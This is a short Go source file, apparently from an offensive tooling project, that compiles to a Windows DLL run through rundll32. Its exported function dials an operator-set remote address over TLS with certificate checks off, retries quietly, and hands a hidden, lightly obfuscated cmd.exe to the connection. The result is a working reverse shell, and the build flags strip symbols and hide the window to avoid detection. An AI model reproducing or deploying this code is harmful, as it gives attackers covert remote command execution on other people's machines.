package main

// Build:
//   GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc \
//   go build -buildmode=c-shared -ldflags="-w -s -H=windowsgui -X 'main.Remote=IP:PORT'" \
//   -o tacos.dll ./cmd/tacosdll/tacosdll.go
//
// Run: rundll32.exe ./tacos.dll,Tacos

import (
	"crypto/tls"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

import "C"

var Remote string

//export Tacos
func Tacos() {
	if Remote == "" {
		return
	}

	conf := &tls.Config{
		InsecureSkipVerify: true,
	}

	dialer := &net.Dialer{
		Timeout: 10 * time.Second,
	}

	maxRetries := 10
	for attempt := 0; attempt <= maxRetries; attempt++ {
		conn, err := tls.DialWithDialer(dialer, "tcp", Remote, conf)
		if err != nil {
			time.Sleep(15 * time.Second)
			continue
		}

		cmd := exec.Command(strings.ToLower(fmt.Sprintf("%s%s", "Cm", "D.exE")))
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Run()
		conn.Close()
		break
	}
}

func main() {}
